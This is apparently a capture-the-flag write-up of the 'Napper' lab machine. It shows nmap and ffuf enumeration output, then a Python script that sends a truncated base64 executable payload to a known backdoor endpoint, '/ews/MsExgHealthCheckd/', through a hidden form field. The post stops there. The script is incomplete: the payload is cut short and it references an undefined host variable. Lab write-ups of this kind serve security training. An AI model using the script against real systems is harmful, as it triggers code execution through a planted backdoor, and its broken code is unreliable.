---
layout: post
title: Napper
date: '2023-11-14 05:10:51 +0300'
---

## Enumeration
```bash
sudo nmap -A -p- -T4 10.10.11.240
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 05:03 EAT
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp  open  ssl/http   Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Research Blog | Home 
|_ssl-date: 2023-11-14T09:09:13+00:00; +6h59m52s from scanner time.
|_http-generator: Hugo 0.112.3
|_http-server-header: Microsoft-IIS/10.0
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m51s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   311.85 ms 10.10.14.1
2   312.34 ms app.napper.htb (10.10.11.240)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 377.04 seconds
```

```bash
echo '10.10.11.240 app.napper.htb' | sudo tee -a /etc/hosts
```

```bash
echo '10.10.11.240 internal.napper.htb' | sudo tee -a /etc/hosts
```

```bash
ffuf -w ~/Documents/seclists/subdomains-top1million-5000.txt -u https://app.napper.htb/ -H 'Host: FUZZ.napper.htb ' -fs 5602

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : https://app.napper.htb/
 :: Wordlist         : FUZZ: /home/b3nj4h/Documents/seclists/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.napper.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 5602
________________________________________________

[Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 484ms]
    * FUZZ: internal
```

[elastic reference](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)

```python
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings (category=InsecureRequestWarning)

hosts = ["192.168.1.191"]
payload = "TVqQAAMAAAAEAAAA[...]AAA"
form_field = f"sdafwe3rwe23={requests.utils.quote(payload)}"

url_ssl = f"https://{h}/ews/MsExgHealthCheckd/"
try:
    r_ssl = requests.post(url_ssl, data=form_field, verify=False) 
    print(f"{url_ssl} {r_ssl.status_code} {r_ssl.headers}")
except KeyboardInterrupt:
    exit()
except Exception as e:
    print(e)
pass
```